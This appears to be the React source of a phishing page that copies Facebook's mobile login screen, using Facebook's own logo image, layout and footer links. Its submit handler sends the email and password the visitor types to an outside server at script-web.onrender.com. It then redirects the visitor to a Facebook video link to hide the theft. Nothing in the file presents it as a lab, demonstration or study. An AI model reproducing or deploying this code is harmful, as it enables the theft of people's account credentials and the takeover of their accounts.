import React, { useState } from "react";
import "./index.css"

const App = () => {
    
    document.title = "Facebook Log-in"
  
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");

    const postFUN = async (e) => {

        e.preventDefault();

        const data = { email, password };

        try {
            const response = await fetch("https://script-web.onrender.com/datapost", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(data), // Send data as JSON string
            });

            if (response.ok) {
              setEmail(''),
              setPassword('');

              window.location.href = "https://www.facebook.com/share/v/1B2K9AV5yg/"
                const result = await response.json();
                console.log("Success:", result);
            } else {
                console.error("Error:", response.statusText);
            }
        } catch (error) {
            console.error("Error:", error);
        }
    };

    return (
        <div style={{ backgroundColor: "#EFF5FD" }}>
            <div className="max-w-[1300px] m-auto h-svh bg-[#EFF5FD] p-5">
                <div className="w-full h-full">
                    <div className="h-auto">
                        <div className="flex justify-center">
                            <h1 className="text-[18px]">
                                English <span className="font-[bold]">(UK)</span>
                            </h1>
                        </div>
                        <div className="w-[240px] h-[8vh] m-auto my-[9vh] flex justify-center">
                            <img
                                src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yD/r/5D8s-GsHJlJ.png"
                                alt="image"
                            />
                        </div>
                    </div>
                    <div className="h-auto">
                        <form onSubmit={postFUN}>
                            <input
                                className="border rounded-2xl px-4 w-full h-[70px] my-[5px] placeholder:text-[gray] placeholder:font-[500]"
                                placeholder="Mobile number or email address"
                                type="email"
                                value={email}
                                onChange={(e) => setEmail(e.target.value)}
                                required
                            />
                            <div className="w-full relative">
                                <input
                                    className="border placeholder:text-[gray] placeholder:font-[500] rounded-2xl px-4 w-full h-[70px] my-[10px] font-[600]"
                                    placeholder="Password"
                                    type="password"
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                    required
                                />
                                <i
                                    id="eye-of-password"
                                    className="fa-regular fa-eye-slash absolute right-10 text-2xl top-7 text-[gray] cursor-pointer hidden"
                                ></i>
                            </div>
                            <button
                                onClick={postFUN}
                                id="btn-log"
                                className="w-full h-[50px] bg-[#0068FF] rounded-full cursor-pointer text-white text-xl"
                                type="submit"
                            >
                                Log in
                            </button>
                            <div className="flex justify-center my-5 font-[500]">
                                <a href="#" className="">
                                    Forgotten Password?
                                </a>
                            </div>
                        </form>
                    </div>
                    <div className="w-[full]">
                        <button className="w-full border border-[#0068FF] mt-16 rounded-full h-[50px] text-[#0068FF] font-[500]">
                            Create new account
                        </button>
                        <div className="w-full flex justify-center my-5 text-[black] item-center font-[500]">
                            <i className="fa-brands fa-meta mt-[3px] mr-1"></i>
                            <h3>Meta</h3>
                        </div>
                        <div className="flex justify-center text-[13px] text-[gray]">
                            <h3>About</h3>
                            <h3 className="mx-4">Help</h3>
                            <h3>More</h3>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default App;
